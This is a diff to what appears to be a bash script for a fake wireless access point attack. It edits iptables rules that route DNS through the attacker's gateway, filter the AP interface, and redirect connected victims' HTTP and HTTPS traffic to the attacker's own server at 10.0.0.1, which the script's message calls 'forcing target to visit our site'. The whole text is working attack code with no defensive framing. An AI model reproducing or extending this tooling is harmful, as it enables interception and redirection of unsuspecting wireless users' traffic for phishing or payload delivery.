@@ -803,7 +803,7 @@ if [ "$apMode" == "transparent" ] || [ "$apMode" == "normal" ]; then
    iptables -A FORWARD -s 10.0.0.0/24 -o $interface -j ACCEPT
    iptables -A FORWARD -d 10.0.0.0/24 -m conntrack --ctstate ESTABLISHED,RELATED -i $interface -j ACCEPT
    iptables --append FORWARD --in-interface $whichinterface --jump ACCEPT                                 # Get everything on the fakeAP # Allow at0 interface connections to be forwarded through other interfaces
-   iptables --table nat --append PREROUTING --proto udp --jump DNAT --to $gatewayIP           # Change destination addresses to the connection with internet (for DNS)
+   iptables --table nat --append PREROUTING --proto udp --destination-port 53 --jump DNAT --to $gatewayIP           # Change destination addresses to the connection with internet (for DNS)
 elif [ "$apMode" == "non" ]; then
    iptables --table nat --append PREROUTING --in-interface $whichinterface --jump REDIRECT                # Blackhole Routing - will redirect all network traffic on the AP interface back to the system. (cache)
 fi
@@ -878,6 +878,12 @@ echo -e "\e[01;32m[>]\e[00m Forcing target to vist our site..."
 # Could of done this at the start, but we were not ready for them then! JUST PORT 80,443 MIND YOU! (All other traffic (e.g. NON HTTP) might have internet access)
 if [ "$verbose" == "2" ] ; then echo "Command: iptables -t nat -A PREROUTING -i $whichinterface -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1"; fi
 if [ "$verbose" == "2" ] ; then echo "Command: iptables -t nat -A PREROUTING -i $whichinterface -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1"; fi
+iptables -A INPUT -p udp -i $whichinterface --sport 53 --dport 1024:65535 -j ACCEPT
+iptables -A INPUT -j ACCEPT -i $whichinterface -p tcp --dport 80 --sport 1024:65535
+iptables -A INPUT -j ACCEPT -i $whichinterface -p tcp --dport 443 --sport 1024:65535
+iptables -A INPUT -p tcp -i $whichinterface --dport $port --sport 1024:65535 -j ACCEPT
+iptables -A INPUT -p udp -i $whichinterface --dport $port --sport 1024:65535 -j ACCEPT
+iptables -A INPUT -i $whichinterface -j DROP # drop all other traffic
 iptables -t nat -A PREROUTING -i $whichinterface -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1
 iptables -t nat -A PREROUTING -i $whichinterface -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1
 sleep 1
@@ -913,12 +919,12 @@ sleep 1
         echo -e "\e[00;31m[-]\e[00m Can't enable ip_forward" 1>&2
         cleanup
       fi
-iptables --table nat --append POSTROUTING -s 10.0.0.0/24 --out-interface $interface --jump MASQUERADE     
-   iptables -A FORWARD -s 10.0.0.0/24 -o $interface -j ACCEPT
-   iptables -A FORWARD -d 10.0.0.0/24 -m conntrack --ctstate ESTABLISHED,RELATED -i $interface -j ACCEPT
-   iptables --append FORWARD --in-interface $whichinterface --jump ACCEPT                                 
-   iptables --table nat --append PREROUTING --proto udp --jump DNAT --to $gatewayIP           
-   iptables -A OUTPUT -s 10.0.0.0/24 -i $interface -d $gatewayIP -p all -j DROP
+      iptables --table nat --append POSTROUTING -s 10.0.0.0/24 --out-interface $interface --jump MASQUERADE     
+      iptables -A FORWARD -s 10.0.0.0/24 -o $interface -j ACCEPT
+      iptables -A FORWARD -d 10.0.0.0/24 -m conntrack --ctstate ESTABLISHED,RELATED -i $interface -j ACCEPT
+      iptables --append FORWARD --in-interface $whichinterface --jump ACCEPT                                 
+      iptables --table nat --append PREROUTING --proto udp --jump DNAT --to $gatewayIP           
+      iptables -A INPUT -s 10.0.0.0/24 -i $interface -d $gatewayIP -p all -j DROP  #protect our gateway
    fi
 
 #----------------------------------------------------------------------------------------------#
